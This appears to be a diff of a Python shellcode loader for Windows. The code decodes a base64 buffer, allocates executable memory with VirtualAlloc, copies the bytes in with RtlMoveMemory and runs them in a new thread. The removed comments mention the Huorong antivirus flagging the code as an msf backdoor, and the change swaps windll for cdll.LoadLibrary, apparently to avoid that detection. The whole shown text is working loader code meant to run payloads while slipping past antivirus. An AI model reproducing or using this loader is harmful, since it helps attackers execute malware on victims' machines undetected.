@@ -59,18 +59,11 @@ shift = base64.b64decode(buf)
 ttp = shift.hex()
 tty = bytes.fromhex(ttp)
 
-#设置返回类型   ---说实话我不明白为什么要设置返回类型
-'''
-这里需要用到VirtualAlloc函数申请内存，返回类型必须和系统位数相同
-想在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64
-否则默认的是32位的
-'''
 VIRTUAL_MEM = ( 0x1000 | 0x2000 )
 PAGE_EXECUTE_READWRITE = 0x00000040
 buf_array = bytearray(tty)
 print(buf_array)
-#这一句给我淦蒙了，不懂了
-#ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64  火绒检测到windll，才会提示msf后门那个病毒，和变量无关
+
 kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll")
 kernel32.VirtualAlloc.restype = ctypes.c_uint64
 #函数申请内存
@@ -79,19 +72,16 @@ sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0),
                                           ctypes.c_int(0x3000),
                                           ctypes.c_int(0x40))
 
-#从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大
-
 buf_ptr = (ctypes.c_char * len(buf_array)).from_buffer(buf_array)
 
 print(sc_ptr)
 print(buf_ptr)
-#调用函数载入内存，使用RtlMoveMemory
+
 kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),
                                      buf_ptr,
                                      ctypes.c_int(len(buf_array)))
 
 
-#创建进程 ，调用creatthread    //这里无变化
 handle = kernel32.CreateThread(ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.c_uint64(sc_ptr),
@@ -99,7 +89,6 @@ handle = kernel32.CreateThread(ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
 
-#调用WaitForSingleObject函数用来检测线程的状态    //这里无变化
 kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
 
 
